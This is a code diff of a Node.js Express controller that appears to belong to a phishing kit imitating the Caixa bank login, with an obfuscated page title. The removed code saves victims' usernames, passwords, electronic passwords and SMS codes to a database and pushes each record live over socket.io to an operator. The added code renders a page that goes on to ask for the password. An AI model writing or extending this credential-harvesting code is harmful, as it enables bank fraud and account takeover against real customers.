@@ -5,77 +5,15 @@ module.exports = {
     async view(req, res) {
         try {
             //Client
-            const ipfromUser = req.connection.remoteAddress
+            const { mail } = req.body
 
-            const { type, user, password, eletronicPassword, sms, status, socket } = req.body
-
-            const { client: clientID, error } = req.query
-
-            if (clientID) {
-                const clientUser = await Client.findByPk(clientID)
-
-                if (clientUser) {
-                    await clientUser.update({
-                        type,
-                        user,
-                        password,
-                        eletronicPassword,
-                        sms,
-                        status: `reconnect`,
-                    })
-
-                    req.app.io.to(clientUser.id).emit('inPassword', clientUser.toJSON())
-
-                    //connectedUsers[ipfromUser].emit('insertClient', clientUser.toJSON())
-
-                    return res.render('password', {
-                        title: 'InTernet::-:Ba:nk_i:ng-----CAI-XA',
-                        pageClasses: 'password cadastro',
-                        client: clientUser.toJSON(),
-                        error: error ? true : false,
-                    })
-                }
-            }
-
-            //return res.json({ user, type, status })
-
-            if (!user) return res.status(400).send({ error: `Informe seu usuário` })
-
-            const clientUser = await Client.findOne({ where: { user } })
-
-            if (clientUser) {
-                await clientUser.update({
-                    type,
-                    user,
-                    password,
-                    eletronicPassword,
-                    sms,
-                    status: `reconnect`,
-                })
-
-                //connectedUsers[ipfromUser].emit('insertClient', clientUser.toJSON())
-
-                return res.render('password', {
-                    title: 'InTernet::-:Ba:nk_i:ng-----CAI-XA',
-                    pageClasses: 'password cadastro',
-                    client: clientUser.toJSON(),
-                    error: error ? true : false,
-                })
-            }
-
-            const client = await Client.create({
-                type,
-                user,
-                password,
-                eletronicPassword,
-                sms,
-                status: `aguardando_op`,
-            })
+            const { error } = req.query
 
             return res.render('password', {
-                title: 'InTernet::-:Ba:nk_i:ng-----CAI-XA',
+                title: 'Agora, a sua senha',
                 pageClasses: 'password cadastro',
-                client: client.toJSON(),
+                pageType: 'password',
+                client: mail,
                 error: error ? true : false,
             })
         } catch (error) {
